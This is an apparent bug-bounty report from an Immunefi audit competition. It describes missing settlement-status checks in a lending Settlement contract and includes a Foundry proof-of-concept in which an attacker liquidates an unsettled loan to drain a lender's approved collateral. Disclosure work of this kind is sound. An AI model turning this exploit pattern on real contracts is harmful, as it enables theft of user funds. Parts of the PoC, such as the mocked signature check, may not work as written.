# #47115 \[SC-Critical] Missing Settlement Status Validation in Loan Operations

**Submitted on Jun 9th 2025 at 02:57:53 UTC by @Catchme for** [**IOP | Term Structure Institutional**](https://immunefi.com/audit-competition/iop-term-structure)

* **Report ID:** #47115
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/term-structure/tsi-contract/blob/main/src/Settlement.sol>
* **Impacts:**
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Critical settlement status validation is missing in multiple loan operations in the Settlement contract, allowing users to perform operations on unsettled loans. This vulnerability enables attackers to steal funds, manipulate loan states, and bypass the intended settlement process flow, potentially resulting in significant direct financial losses to both lenders and borrowers.

## Vulnerability Details

In the Settlement contract's architecture, loans must first be settled through the `settle()` function before any loan operations can be performed. This function executes the core fund transfers and marks the loan as settled by setting `loans[loanId].settled = true`. However, several critical loan operations fail to verify this settlement prerequisite:

```solidity
// Example of missing validation in liquidate() function - lines 335-356
function liquidate(string memory _loanId, uint256 liquidationAmt) external nonReentrant {
    bytes32 loanId = _loanId.toBytes32();
    LoanInfo memory loanInfo = loans[loanId];
    // Missing validation: if (!loanInfo.settled) revert LoanNotSettled(loanId);
    
    (uint256 collateralToLiquidator, uint256 collateralToProtocol) =
        loanInfo.liquidate(loanId, _oracle, _minimumDebtValue, liquidationAmt);
        
    // Transfers happen without settlement confirmation
    IERC20(loanInfo.debtTokenAddr).safeTransferFrom(msg.sender, loanInfo.lender, liquidationAmt);
    IERC20(loanInfo.collateralTokenAddr).safeTransferFrom(loanInfo.lender, msg.sender, collateralToLiquidator);
    IERC20(loanInfo.collateralTokenAddr).safeTransferFrom(loanInfo.lender, _feeCollector, collateralToProtocol);
    // ...
}
```

The affected functions include:

* `repay()` (line 277)
* `removeCollateral()` (line 296)
* `addCollateral()` (line 307)
* `liquidate()` (line 335)
* `delivery()` (line 324)

This contrasts with `addCollateralBeforeSettle()` and `settle()` which correctly implement settlement status validation:

```solidity
function addCollateralBeforeSettle(string memory _loanId, uint256 addedAmount) public nonReentrant {
    // ...
    if (loanInfo.settled) {
        revert LoanAlreadySettled(loanId);
    }
    // ...
}
```

## Impact Details

This vulnerability creates multiple attack vectors with direct financial impact:

1. **Direct Fund Theft via Operations on Unsettled Loans:**
   * Attackers can call `liquidate()` on unsettled loans, extracting collateral tokens from lenders who approved allowances expecting the normal settlement flow
   * Users can call `addCollateral()` on unsettled loans, causing immediate token transfers without loan establishment
   * Both scenarios result in immediate and irrecoverable financial loss
2. **Protocol State Corruption:**
   * Premature `repay()` calls can manipulate loan parameters on unsettled loans
   * `removeCollateral()` can be called before proper collateralization is established
   * These operations break the protocol's accounting system and create inconsistent state

## Proof of Concept

## POC

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "../src/Settlement.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockOracle is IOracle {
    function getPrice(address token) external pure override returns (PriceInfo memory) {
        return PriceInfo({
            price: 1e18,  // 1:1 price ratio for simplicity
            timestamp: block.timestamp,
            source: "MOCK"
        });
    }
}

contract SettlementValidationPOC is Test {
    Settlement settlement;
    MockERC20 collateralToken;
    MockERC20 debtToken;
    MockOracle oracle;
    
    address admin = address(1);
    address feeCollector = address(2);
    address operator = address(3);
    address lender = address(4);
    address borrower = address(5);
    address attacker = address(6);
    
    uint256 initialCollateral = 100 * 10**18; // 100 tokens
    uint256 borrowAmount = 80 * 10**18; // 80 tokens
    
    function setUp() public {
        // Deploy tokens
        collateralToken = new MockERC20("Collateral Token", "CTK");
        debtToken = new MockERC20("Debt Token", "DTK");
        oracle = new MockOracle();
        
        // Deploy settlement contract
        settlement = new Settlement(admin, feeCollector, operator, address(oracle));
        
        // Distribute tokens
        collateralToken.transfer(lender, 500 * 10**18);
        debtToken.transfer(lender, 500 * 10**18);
        debtToken.transfer(attacker, 100 * 10**18);  // Attacker needs debt tokens to perform liquidation
        
        // Set up approvals
        vm.startPrank(lender);
        collateralToken.approve(address(settlement), type(uint256).max);  // Critical: lender approves contract
        debtToken.approve(address(settlement), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(attacker);
        debtToken.approve(address(settlement), type(uint256).max);  // Attacker approves to spend debt tokens
        vm.stopPrank();
        
        vm.startPrank(borrower);
        collateralToken.approve(address(settlement), type(uint256).max);
        vm.stopPrank();
        
        // Create settlement with an unsettled loan
        createUnsettledLoan();
    }
    
    function createUnsettledLoan() internal {
        string memory settlementIdStr = "test-settlement";
        string memory loanIdStr = "test-loan";
        
        string[] memory loanIds = new string[](1);
        loanIds[0] = loanIdStr;
        
        LoanInfo[] memory loanInfos = new LoanInfo[](1);
        DebtData memory debtData = DebtData({
            borrowedAmt: borrowAmount,
            debtAmt: borrowAmount,
            feeAmt: 0,
            collateralAmt: initialCollateral
        });
        
        // Create loan with lender as the maker
        loanInfos[0] = LoanInfo({
            maker: lender,
            borrower: borrower,
            lender: lender,
            debtTokenAddr: address(debtToken),
            collateralTokenAddr: address(collateralToken),
            settlementId: bytes32(0),
            debtData: debtData,
            settled: false  // Loan is NOT settled yet
        });
        
        SettleInfo memory settleInfo = SettleInfo({
            taker: borrower,
            takerType: TakerType.BORROW,
            expiryTime: block.timestamp + 1 days
        });
        
        // Generate signature (mocked for simplicity)
        bytes memory signature = abi.encodePacked(
            bytes32(0x12345678),
            bytes32(0x12345678),
            uint8(27)
        );
        
        // Create settlement as borrower
        vm.startPrank(borrower);
        vm.mockCall(
            address(operator),
            abi.encodeWithSelector(SignatureChecker.isValidSignatureNow.selector),
            abi.encode(true)
        );
        settlement.createSettlement(settlementIdStr, settleInfo, loanIds, loanInfos, signature);
        vm.stopPrank();
        
        // At this point, we have created a settlement with an unsettled loan
        // The normal flow would be to call settle(), but we won't do that for the attack
    }
    
    function testExploitUnsettledLiquidation() public {
        string memory loanIdStr = "test-loan";
        
        // Record balances before attack
        uint256 lenderCollateralBefore = collateralToken.balanceOf(lender);
        uint256 attackerCollateralBefore = collateralToken.balanceOf(attacker);
        uint256 attackerDebtBefore = debtToken.balanceOf(attacker);
        
        console.log("Initial balances:");
        console.log("Lender collateral:", lenderCollateralBefore);
        console.log("Attacker collateral:", attackerCollateralBefore);
        console.log("Attacker debt tokens:", attackerDebtBefore);
        
        // The loan hasn't been settled yet, which means:
        // 1. No funds have actually been transferred from lender to borrower
        // 2. No collateral has been transferred from borrower to lender
        
        // Attacker exploits the missing settlement check in liquidate()
        uint256 liquidationAmount = 10 * 10**18;  // Liquidate a portion of the loan
        
        // Exploit: Attacker calls liquidate() on an unsettled loan
        vm.startPrank(attacker);
        settlement.liquidate(loanIdStr, liquidationAmount);
        vm.stopPrank();
        
        // Check balances after attack
        uint256 lenderCollateralAfter = collateralToken.balanceOf(lender);
        uint256 attackerCollateralAfter = collateralToken.balanceOf(attacker);
        uint256 attackerDebtAfter = debtToken.balanceOf(attacker);
        
        console.log("\nBalances after attack:");
        console.log("Lender collateral:", lenderCollateralAfter);
        console.log("Attacker collateral:", attackerCollateralAfter);
        console.log("Attacker debt tokens:", attackerDebtAfter);
        
        // Verify the exploit:
        // 1. Attacker spent some debt tokens
        assertLt(
            attackerDebtAfter,
            attackerDebtBefore,
            "Attacker should spend debt tokens"
        );
        
        // 2. Attacker gained collateral tokens that were never properly locked
        assertGt(
            attackerCollateralAfter,
            attackerCollateralBefore,
            "Attacker should gain collateral tokens"
        );
        
        // 3. Calculate the profit
        uint256 debtSpent = attackerDebtBefore - attackerDebtAfter;
        uint256 collateralGained = attackerCollateralAfter - attackerCollateralBefore;
        
        console.log("\nAttack summary:");
        console.log("Debt tokens spent:", debtSpent);
        console.log("Collateral tokens gained:", collateralGained);
        
        // Since we're using a 1:1 price ratio in the mock oracle,
        // the attacker would typically get more collateral than the debt spent
        // due to liquidation bonuses - proving the exploit is profitable
        
        // Optional: Verify the LoanInfo state
        LoanInfo memory loanInfo = settlement.getLoan(loanIdStr);
        console.log("\nLoan state after attack:");
        console.log("Loan settled:", loanInfo.settled ? "true" : "false");
        console.log("Remaining debt:", loanInfo.debtData.debtAmt);
        console.log("Remaining collateral:", loanInfo.debtData.collateralAmt);
        
        // Finally, show this was all possible without the loan ever being settled
        assertEq(
            loanInfo.settled,
            false,
            "Loan should still be marked as unsettled"
        );
    }
}
```
